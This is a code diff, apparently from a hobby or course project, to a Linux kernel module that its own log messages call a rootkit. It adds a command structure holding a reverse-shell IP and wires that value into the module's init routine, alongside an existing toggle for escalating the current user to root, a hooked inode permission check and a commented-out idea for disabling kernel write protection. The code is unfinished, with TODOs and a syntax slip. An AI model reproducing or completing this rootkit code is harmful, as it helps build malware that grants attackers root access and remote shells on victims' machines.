@@ -37,6 +37,28 @@ static bool escalate_privileges = false;
 module_param(escalate_privileges, bool, 0770);
 MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");
 
+/**
+ * Data structures
+ */
+
+static struct timer_list polling_timer;
+
+struct command_vals {
+    // TODO: Add properties for each of the commands we can accept
+    char* rev_shell_ip;
+    // etc
+}
+
+static struct command_vals cmds;
+
+/**
+ * Function Headers
+ */
+
+void poll_for_commands();
+void set_new_timer(const unsigned int msecs);
+void setup_timer(struct timer_list* timer, void (*function)(unsigned long), unsigned long data);
+
 // TODO: Figure out if this is needed at all.
 // /**
 //  * Overwrite the 16th bit in the CR0 register to disable write protection.
@@ -76,8 +98,6 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 //     // TODO
 // }
 
-static struct timer_list polling_timer;
-
 void set_new_timer(const unsigned int msecs) {
     printk("Starting timer to fire in %u (%ld)\n", msecs, jiffies);
     if (mod_timer(&polling_timer, jiffies + msecs_to_jiffies(msecs))) {
@@ -116,6 +136,8 @@ static int __init rootkit_init(void) {
     printk(KERN_INFO "Initializing rootkit.\n");
     printk(KERN_INFO "Initializing timer.\n");
     khook_init();
+    // TODO: Populate cmds struct to be passed to poll_for_commands(data)
+    cmds.rev_shell_ip = rev_shell_ip;
     // Set up timer to check for changes in the parameters, to detect commands being run.
     setup_timer(&polling_timer, poll_for_commands, 0);
     return 0;
